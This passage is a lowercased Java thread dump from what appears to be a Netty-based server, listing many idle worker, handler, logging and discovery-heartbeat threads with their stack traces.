java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #67 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #66 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #65 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #64 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #63 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #62 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #61 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #60 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #59 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #58 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #57 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #56 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #55 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #54 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #53 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "logback-3" #52 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1088) at java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:809) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "discoveryclient-heartbeatexecutor-0" #51 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.synchronousqueue$transferstack) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.synchronousqueue$transferstack.awaitfulfill(synchronousqueue.java:458) at java.util.concurrent.synchronousqueue$transferstack.transfer(synchronousqueue.java:362) at java.util.concurrent.synchronousqueue.take(synchronousqueue.java:924) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748) "nettyservernioworker_1_16" #50 daemon prio=5 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable at sun.nio.ch.epollarraywrapper.epollwait(native method) at sun.nio.ch.epollarraywrapper.poll(epollarraywrapper.java:269) at sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:93) at sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:86) - locked < > (a io.netty.channel.nio.selectedselectionkeyset) - locked < > (a java.util.collections$unmodifiableset) - locked < > (a sun.nio.ch.epollselectorimpl) at sun.nio.ch.selectorimpl.select(selectorimpl.java:97) at io.netty.channel.nio.selectedselectionkeysetselector.select(selectedselectionkeysetselector.java:62) at io.netty.channel.nio.nioeventloop.select(nioeventloop.java:753) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:408) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #49 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "nettyservernioworker_1_16" #48 daemon prio=5 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable at sun.nio.ch.epollarraywrapper.epollwait(native method) at sun.nio.ch.epollarraywrapper.poll(epollarraywrapper.java:269) at sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:93) at sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:86) - locked < > (a io.netty.channel.nio.selectedselectionkeyset) - locked < > (a java.util.collections$unmodifiableset) - locked < > (a sun.nio.ch.epollselectorimpl) at sun.nio.ch.selectorimpl.select(selectorimpl.java:97) at io.netty.channel.nio.selectedselectionkeysetselector.select(selectedselectionkeysetselector.java:62) at io.netty.channel.nio.nioeventloop.select(nioeventloop.java:753) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:408) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #47 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #46 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #45 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #44 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "nettyservernioworker_1_16" #43 daemon prio=5 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable at sun.nio.ch.epollarraywrapper.epollwait(native method) at sun.nio.ch.epollarraywrapper.poll(epollarraywrapper.java:269) at sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:93) at sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:86) - locked < > (a io.netty.channel.nio.selectedselectionkeyset) - locked < > (a java.util.collections$unmodifiableset) - locked < > (a sun.nio.ch.epollselectorimpl) at sun.nio.ch.selectorimpl.select(selectorimpl.java:97) at io.netty.channel.nio.selectedselectionkeysetselector.select(selectedselectionkeysetselector.java:62) at io.netty.channel.nio.nioeventloop.select(nioeventloop.java:753) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:408) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #42 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #41 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #40 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "nettyservernioworker_1_16" #39 daemon prio=5 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable at sun.nio.ch.epollarraywrapper.epollwait(native method) at sun.nio.ch.epollarraywrapper.poll(epollarraywrapper.java:269) at sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:93) at sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:86) - locked < > (a io.netty.channel.nio.selectedselectionkeyset) - locked < > (a java.util.collections$unmodifiableset) - locked < > (a sun.nio.ch.epollselectorimpl) at sun.nio.ch.selectorimpl.select(selectorimpl.java:97) at io.netty.channel.nio.selectedselectionkeysetselector.select(selectedselectionkeysetselector.java:62) at io.netty.channel.nio.nioeventloop.select(nioeventloop.java:753) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:408) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #38 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #37 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "nettyservernioworker_1_16" #36 daemon prio=5 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable at sun.nio.ch.epollarraywrapper.epollwait(native method) at sun.nio.ch.epollarraywrapper.poll(epollarraywrapper.java:269) at sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:93) at sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:86) - locked < > (a io.netty.channel.nio.selectedselectionkeyset) - locked < > (a java.util.collections$unmodifiableset) - locked < > (a sun.nio.ch.epollselectorimpl) at sun.nio.ch.selectorimpl.select(selectorimpl.java:97) at io.netty.channel.nio.selectedselectionkeysetselector.select(selectedselectionkeysetselector.java:62) at io.netty.channel.nio.nioeventloop.select(nioeventloop.java:753) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:408) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:897) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "serverhandlerthread_1_500" #35 daemon prio=5 os_prio=0 tid= nid= waiting on condition [ ] java.lang.thread.state: waiting (parking) at sun.misc.unsafe.park(native method) - parking to wait for < > (a java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject) at java.util.concurrent.locks.locksupport.park(locksupport.java:175) at java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.await(abstractqueuedsynchronizer.java:2039) at java.util.concurrent.linkedblockingqueue.take(linkedblockingqueue.java:442) at java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1074) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1134) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748) "nettyservernioworker_1_16" #34 daemon prio=5 os_prio=0 tid= nid= runnable [ ] java.lang.thread.state: runnable at sun.nio.ch.epollarraywrapper.epollwait(native method) at sun.nio.ch.epollarraywrapper.poll(epollarraywrapper.java:269) at sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:93) at sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:86) - locked < > (a io.netty.channel.nio.selectedselectionkeyset) - locked < > (a java.util.collections$unmodifiableset) - locked < > (a sun.nio.ch.epollselectorimpl) at 